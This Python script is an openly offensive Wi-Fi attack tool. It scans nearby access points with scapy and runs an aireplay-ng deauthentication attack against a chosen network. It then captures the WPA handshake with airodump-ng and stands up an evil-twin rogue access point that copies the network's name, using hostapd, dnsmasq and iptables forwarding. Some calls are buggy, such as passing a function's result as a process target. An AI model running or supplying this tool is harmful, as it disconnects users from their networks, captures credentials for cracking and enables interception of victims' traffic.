from multiprocessing import Process
from scapy.all import *
import time
import os
import conf_files as cf
import pandas as pd

iface = ''
bssid_name = ""
essid_name = ""
channel_no = 0
bssid_list = []
essid_list = []
channel_list = []

def mac_extract():
    data = pd.read_csv('handshake-01.csv')
    mac = data.iloc[2][0]
    #print(data)
    #print(mac)
    #gets mac by removing redundant columns
    #first_col = data.iloc[:,0]
    #remove_row = data.iloc[1:,:]
    #remove_row2 = remove_row.iloc[1:,:]
    return mac
    
def ap_scanner():
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("Index \tChannel \t MAC \t\t ESSID")
    #start the channel changer
    sniff(iface = iface, prn = ap_sniffer)
    #stop the channel changer
    
def ap_sniffer(pkt) :
    global bssid_list, essid_list, channel_list
    # if packet has 802.11 layer
    if pkt.haslayer(Dot11Beacon):
            if pkt.addr2 not in bssid_list:
                channel = pkt.channel
                channel_list.append(channel)
                bssid = pkt[Dot11].addr2
                bssid_list.append(bssid)
                essid = pkt[Dot11Elt].info.decode()
                essid_list.append(essid)
                print(len(bssid_list),'\t ',channel,'\t ',bssid,'\t ',essid)

def deauth(dist):
    os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface}")

def handshake_capture():
        global essid_name, bssid_name, channel_no
        mac_adder = int(input("\nEnter the index of the network you want to target: ")) - 1
        bssid_name = bssid_list[mac_adder]
        essid_name = essid_list[mac_adder]
        channel_no = channel_list[mac_adder]
        print("\nNetwork to target:\n")
        print(channel_no,'\t',bssid_name,'\t', essid_name)
        dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
        print("Capturing 4-Way handshake [{}]...".format(bssid_name))
        #start deauthentication process
        p_deauth = Process(target = deauth(dist))
        p_deauth.start()
        #os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface} | xterm -e airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
        os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
        #stop deauthentication process
        p_deauth.terminate()
        return essid_name

#turns the wifi interface into monitor mode for scanning
def setup_monitor(iface):
    try:
        os.system(f'airmon-ng start {iface}')
    except:
        os.system('Failed to setup interface in monitor mode')
        sys.exit(1)
    iface = str(iface)+'mon'
    return iface

def disable_monitor(iface):
    try:
        os.system(f'airmon-ng stop {iface}')
    except:
        os.system('Failed to setup interface in managed mode')
        sys.exit(1)
    return iface

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def create_configs(iface, essid, channel_no):
    cf.create_hostapd(iface, essid, channel_no)
    cf.create_dnsmasq(iface)

def rogue_ap():
    global iface, bssid_name
    os.system('sudo killall dnsmasq')
    # os.system(f'ifconfig {iface} down')
    # os.system(f'macchanger --mac={bssid_name} {iface}')
    # os.system(f'ifconfig {iface} up')
    os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
    os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
    #ip forwarding
    os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
    os.system(f'iptables --append FORWARD --in-interface {iface} -j ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
    
def main():
    global iface, essid_name, bssid_name, channel_no
    iface = setup_monitor("wlan0")
    print("\nWhen Done Press CTRL+C")
    time.sleep(2)
    cc = Process(target = change_channel)
    cc.start()
    ap_scanner()
    cc.terminate()
    handshake_capture()
    client_mac = mac_extract()
    print(client_mac)
    disable_monitor(iface)
    print("Fake Access Point\nWhen Done Press CTRL+C")
    time.sleep(2.0)
    create_configs(iface, essid_name, channel_no)
    rogue_ap()
    
if __name__ == "__main__":
    main()